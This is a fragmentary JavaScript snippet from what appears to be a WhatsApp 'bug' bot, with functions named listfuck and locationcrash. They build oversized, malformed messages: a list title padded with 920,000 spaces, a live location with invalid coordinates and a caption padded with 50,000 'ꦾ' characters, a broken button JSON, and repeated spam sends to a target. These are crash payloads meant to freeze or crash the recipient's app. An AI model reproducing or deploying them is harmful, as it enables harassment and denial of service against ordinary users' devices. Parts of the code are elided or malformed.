...
async function listfuck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫"+" ".repeat(920000),
        'footerText': `𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
        'description': `𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫', url : , merchant_url :  }"
            }],
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ジン 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジン 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジン 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジン 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジン 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジン 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジン 𝐋𝐲𝐧𝐧𝐙𝐱𝐃  𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジン 𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
await locationcrash(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe)
Zynxzoo.sendMessage(Pe, {text: `\`𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(Pe, {text: `\`𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(Pe, {text: `\`𝐋𝐲𝐧𝐧𝐙𝐱𝐃 𝐂𝐨𝐮𝐧𝐭𝐞𝐫\``}, {quoted: m})
